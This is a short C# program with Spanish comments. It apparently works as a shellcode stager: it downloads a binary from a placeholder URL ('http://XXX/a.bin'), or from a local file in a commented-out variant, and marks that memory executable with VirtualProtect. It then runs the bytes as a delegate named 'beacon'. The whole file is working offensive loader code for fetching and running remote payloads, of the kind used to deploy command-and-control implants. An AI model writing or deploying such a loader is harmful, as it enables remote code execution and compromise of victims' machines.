using System;
using System.IO; //Para cargar el bin en local
using System.Net;
using System.Runtime.InteropServices;

namespace Reflection
{
  public class Program 
  {
    public delegate void beacon();
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwsize, uint flNewProtect, out uint lpflOldProtect);
    public static void Main()
    {
      //Carga desde web
      var wc = new WebClient();
      var sc = wc.DownloadData("http://XXX/a.bin");
      //Fin carga desde web

      //Carga desde local
      //string path = @"C:\Users\Administrador\a.bin";
      //var sc = File.ReadAllBytes(path);


      //if (File.Exists(path))
      //{
      //    Console.WriteLine($"Leídos {sc.Length} bytes");
      //}

      //Fin carga desde local

      GCHandle pinned = GCHandle.Alloc(sc, GCHandleType.Pinned);
      IntPtr ptr = pinned.AddrOfPinnedObject();
      Marshal.Copy(sc, 0, ptr, sc.Length);

      uint lpflOldProtect;
      VirtualProtect(ptr, (UIntPtr)sc.Length, 0x40, out lpflOldProtect);

      beacon exec = Marshal.GetDelegateForFunctionPointer<beacon>(ptr);
      exec();
    }
  }
}